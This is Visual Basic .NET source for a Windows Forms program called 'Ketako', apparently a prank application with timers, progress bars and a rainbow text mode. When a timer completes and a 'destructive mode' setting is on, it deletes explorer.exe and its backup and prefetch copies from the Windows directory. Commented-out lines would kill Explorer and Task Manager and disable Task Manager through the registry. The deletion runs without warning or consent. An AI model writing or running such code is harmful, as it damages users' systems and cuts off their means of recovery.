' Ketako main program
Public Class Form1
    Private Property A As Integer
    Private Property R As Integer
    Private Property G As Integer
    Private Property B As Integer
    Private Property rand As New Random()

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Label3.Hide()
        Timer1.Start()
        Label5.Hide()
        ProgressBar2.Hide()
        ProgressBar3.Hide()
        Label6.Hide()
        Timer2.Start()
        Timer3.Start()
        Timer4.Start()
        'Shell("taskkill /f /im explorer.exe")
        'Shell("taskkill /f /im taskmgr.exe")
        'Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1")
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        ProgressBar2.Increment(1)
        If ProgressBar2.Value = ProgressBar2.Maximum Then
            Form5.Show()
        Else
            Form2.Show()
        End If
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Form3.Show()
        Me.Hide()
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Label3.Show()
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Form4.Show()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Label1.Text = My.Settings.caption1
        Label2.Text = My.Settings.caption2

        ProgressBar1.Increment(1)
        If ProgressBar1.Value = ProgressBar1.Maximum Then
            If My.Settings.destructivemodeenabled = "Yes" Then
                My.Computer.FileSystem.DeleteFile("C:/Windows/explorer.exe")
                My.Computer.FileSystem.DeleteFile("C:/Windows/SysWOW64/explorer.exe")
                If My.Computer.FileSystem.FileExists("C:/Windows/Prefetch/EXPLORER.EXE-082F38A9.pf") = True Then
                    My.Computer.FileSystem.DeleteFile("C:/Windows/Prefetch/EXPLORER.EXE-082F38A9.pf")
                End If
                If My.Computer.FileSystem.FileExists("C:/Windows/system32/dllcache/explorer.exe") = True Then
                    My.Computer.FileSystem.DeleteFile("C:/Windows/system32/dllcache/explorer.exe")
                End If
                Timer1.Stop()
                ProgressBar1.Value = 0
                Form6.Show()
                Me.Hide()
            Else
                Timer1.Stop()
                ProgressBar1.Value = 0
                Form7.Show()
                Me.Hide()
            End If
        End If
    End Sub

    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click
        ProgressBar3.Increment(1)
        If ProgressBar3.Value = ProgressBar3.Maximum Then
            If adminpanel.Created = False Then
                LoginForm1.Show()
            End If
        Else
            Form8.Show()
        End If
    End Sub
    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Label6.Show()
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If My.Settings.rainbowmode = "Yes" Then
            A = rand.Next(0, 255)
            R = rand.Next(0, 255)
            G = rand.Next(0, 255)
            B = rand.Next(0, 255)
        End If
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        If My.Settings.rainbowmode = "Yes" Then
            Label1.ForeColor = Color.FromArgb(A, R, G, B)
            Label2.ForeColor = Color.FromArgb(A, R, G, B)
            Label3.ForeColor = Color.FromArgb(A, R, G, B)
            Label4.ForeColor = Color.FromArgb(A, R, G, B)
            Label5.ForeColor = Color.FromArgb(A, R, G, B)
            Label6.ForeColor = Color.FromArgb(A, R, G, B)
            Label7.ForeColor = Color.FromArgb(A, R, G, B)
        Else
            Label1.ForeColor = Color.Black
            Label2.ForeColor = Color.Black
            Label3.ForeColor = Color.Black
            Label4.ForeColor = Color.Black
            Label5.ForeColor = Color.Black
            Label6.ForeColor = Color.Black
            Label7.ForeColor = Color.Black
        End If
    End Sub

    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        If My.Settings.rainbowmode = "Yes" Then
            Button1.ForeColor = Color.FromArgb(A, R, G, B)
            Button2.ForeColor = Color.FromArgb(A, R, G, B)
            Button3.ForeColor = Color.FromArgb(A, R, G, B)
            Button4.ForeColor = Color.FromArgb(A, R, G, B)
            Button5.ForeColor = Color.FromArgb(A, R, G, B)
            Button6.ForeColor = Color.FromArgb(A, R, G, B)
        Else
            Button1.ForeColor = Color.Black
            Button2.ForeColor = Color.Black
            Button3.ForeColor = Color.Black
            Button4.ForeColor = Color.Black
            Button5.ForeColor = Color.Black
            Button6.ForeColor = Color.Black
        End If
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        Form10.Show()
    End Sub
End Class
